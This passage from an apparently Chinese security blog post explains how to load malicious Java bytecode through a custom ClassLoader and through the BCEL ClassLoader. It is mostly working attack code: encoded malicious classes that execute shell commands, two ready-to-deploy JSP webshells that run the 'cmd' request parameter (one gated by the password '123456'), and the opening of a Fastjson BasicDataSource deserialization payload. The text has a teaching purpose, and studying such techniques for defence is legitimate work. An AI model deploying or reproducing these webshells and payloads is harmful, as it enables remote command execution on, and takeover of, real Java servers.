class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=&quot;</span>);</span><br><span class="line">                    <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                    pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">                    <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (java.security.cert.Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.Evil.ByteCodeEvil&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> constructor.newInstance(cmd).toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>放入我们一开始生成的恶意类的字节码文件，用反射进行执行，最后使用jsp，替换输出为内置对象。就形成了一个jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.Certificate&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page pageEncoding=<span class="string">&quot;GB2312&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">if</span>(name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=&quot;</span>);</span><br><span class="line">                <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">                <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.Evil.ByteCodeEvil&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> constructor.newInstance(cmd).toString();</span><br><span class="line">    response.getWriter().print(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312002047.png"></p><h2 id="0x02-BECL-ClassLoader"><a href="#0x02-BECL-ClassLoader" class="headerlink" title="0x02 BECL ClassLoader"></a>0x02 BECL ClassLoader</h2><blockquote><p>BCEL 的全名为 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p></blockquote><p>根据P神的文章 <a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p><p>在 Java 8u251以前，都是可以使用的</p><p>同理，我们也需要获取<code>BECL</code>的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Evil.ByteCodeEvil;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetBecl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(ByteCodeEvil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code>，先将<code>JAVAClass</code>转换成原生字节码，使用其他类获取字节码也可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(ByteCodeEvil.class.getName());</span><br><span class="line">      <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(clazz.toBytecode(),<span class="literal">true</span>);</span><br><span class="line">      System.out.println(code);</span><br></pre></td></tr></table></figure><p>如图，将会获得<code>Becl</code>字节码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312093020.png"></p><p>动态调试<code>loadClass</code>发现，会判断加载的字节码是否以<code>$$BCEL$$</code>开头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>则编写测试类，继续以0x01中的恶意类为基础，可以实现命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Becl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(bcelCode);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，也可以将输入输出替换为内置对象，做一个jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pwd.equals(PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">    Class&lt;?&gt; clazz = loader.loadClass(bcelCode);</span><br><span class="line">    java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">    <span class="comment">// 回显</span></span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().print(obj.toString());</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Fastjson的BasicDataSource利用"><a href="#Fastjson的BasicDataSource利用" class="headerlink" title="Fastjson的BasicDataSource利用"></a>Fastjson的<code>BasicDataSource</code>利用</h3><p>在BasicDataSource利用链中，主要就是利用了BCEL加载字节码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        